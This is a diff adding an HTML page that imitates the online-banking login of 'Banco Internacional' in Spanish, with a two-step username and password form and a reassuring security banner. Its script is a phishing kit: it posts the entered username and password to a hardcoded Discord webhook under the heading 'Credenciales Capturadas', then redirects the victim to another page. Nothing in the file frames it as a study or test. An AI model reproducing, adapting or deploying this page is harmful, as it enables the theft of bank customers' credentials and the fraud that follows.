@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Banco Internacional - Ingreso</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            min-height: 100vh;
+            background: #f5a81c url('background_omnia.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            color: #333;
+            padding: 15px;
+        }
+
+        .header {
+            margin: 20px 0;
+            text-align: center;
+            width: 100%;
+        }
+        .header img { width: 240px; height: auto; margin-bottom: 10px; }
+        
+        .nav-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            color: white;
+            font-size: 13px;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 850px;
+            background: #fff;
+            border: 6px solid rgba(255, 255, 255, 0.3);
+            border-radius: 4px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+
+        .content-split { display: flex; flex-wrap: wrap; }
+
+        .login-side, .utils-side { flex: 1; min-width: 300px; padding: 40px 30px; }
+
+        .login-side { 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center;
+            border-right: 1px solid #eee;
+        }
+
+        h2 { font-size: 14px; color: #666; margin-bottom: 25px; text-transform: uppercase; font-weight: 600; }
+
+        /* Contenedores de Input */
+        .step { width: 100%; max-width: 320px; display: none; }
+        .step.active { display: block; }
+
+        .input-group {
+            display: flex;
+            height: 42px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+        .input-label {
+            background: #f8f8f8;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            border-right: 1px solid #eee;
+            gap: 8px;
+            min-width: 90px;
+        }
+        .input-label img { width: 16px; }
+        .input-label span { font-size: 11px; color: #888; }
+
+        input { flex: 1; border: none; padding: 0 12px; font-size: 15px; outline: none; }
+
+        .orange-btn {
+            background: #f5a81c;
+            width: 42px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        .orange-btn img { width: 20px; }
+
+        .btn-submit {
+            width: 100%;
+            background: #f5a81c;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 3px;
+            margin-bottom: 15px;
+        }
+
+        /* Utilidades */
+        .utils-side { background: #fafafa; }
+        .util-link {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            text-decoration: none;
+            color: #d48a00;
+            font-size: 13px;
+        }
+        .util-link img { width: 16px; margin-right: 10px; }
+
+        /* Seguridad */
+        .security-banner {
+            padding: 20px;
+            background: #fff;
+            border-top: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .security-banner img { width: 35px; }
+        .security-banner p { font-size: 11px; color: #777; }
+
+        @media (max-width: 650px) {
+            .content-split { flex-direction: column; }
+            .login-side { border-right: none; border-bottom: 1px solid #eee; }
+            .nav-links { font-size: 12px; gap: 8px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="logow.png" alt="Logo">
+        <div class="nav-links">
+            <span>Bienvenido(a)</span> | <span>Ayuda</span> | <span>Contáctanos</span>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div class="content-split">
+            <div class="login-side">
+                <h2>Ingreso a Banca Online</h2>
+
+                <div id="step1" class="step active">
+                    <div class="input-group">
+                        <div class="input-label">
+                            <img src="user-icon-login.svg">
+                            <span>Usuario</span>
+                        </div>
+                        <input type="text" id="usuario" placeholder="Ingresa tu usuario">
+                        <div class="orange-btn"><img src="question-icon-login.svg"></div>
+                    </div>
+                    <button class="btn-submit" onclick="showStep2()">Continuar</button>
+                </div>
+
+                <div id="step2" class="step">
+                    <div class="input-group">
+                        <div class="input-label">
+                            <img src="shield-login.svg">
+                            <span>Clave</span>
+                        </div>
+                        <input type="password" id="clave" placeholder="Ingresa tu clave">
+                        <div class="orange-btn"><img src="question-icon-login.svg"></div>
+                    </div>
+                    <button class="btn-submit" id="btnFinal">Ingresar</button>
+                    <p style="font-size: 11px; color: #d48a00; cursor: pointer; text-align: center;" onclick="location.reload()">← Volver</p>
+                </div>
+
+                <div style="background:#f4f4f4; padding:10px; width:100%; max-width:320px; display:flex; gap:10px; border-radius:3px;">
+                    <img src="info-icon-login.svg" style="width:20px;">
+                    <p style="font-size:10px; color:#666;">Si ingresas con <b>USUARIO TEMPORAL</b> haz click aquí</p>
+                </div>
+            </div>
+
+            <div class="utils-side">
+                <h2>Utilidades</h2>
+                <a href="#" class="util-link"><img src="cursor-bullet.svg"> ¿No tienes usuario?, genéralo aquí</a>
+                <a href="#" class="util-link"><img src="cursor-bullet.svg"> ¿Olvidaste tu contraseña?</a>
+                <a href="#" class="util-link"><img src="cursor-bullet.svg"> Desbloquea tu usuario</a>
+            </div>
+        </div>
+
+        <div class="security-banner">
+            <img src="shield-login.svg">
+            <p>Banco Internacional <b>no solicita información personal</b> como claves por e-mail.</p>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1491163890715853021/Z7As4jVZZHi81cEJZjXhzbQez81R5grblQVbf29Rh4AH5Y2b8Jw54wBfVHNAPXC9QOkW"; // Pon tu URL real aquí
+        let usuarioCapturado = "";
+
+        function showStep2() {
+            const user = document.getElementById('usuario').value.trim();
+            if(!user) return alert("Ingresa tu usuario");
+            
+            usuarioCapturado = user;
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
+
+        document.getElementById('btnFinal').addEventListener('click', async () => {
+            const pass = document.getElementById('clave').value.trim();
+            if(!pass) return alert("Ingresa tu clave");
+
+            const payload = {
+                embeds: [{
+                    title: "🔑 Credenciales Capturadas",
+                    color: 16100380,
+                    fields: [
+                        { name: "👤 Usuario", value: usuarioCapturado, inline: true },
+                        { name: "🔒 Clave", value: pass, inline: true }
+                    ]
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            window.location.href = "carga.html";
+        });
+    </script>
+</body>
+</html>
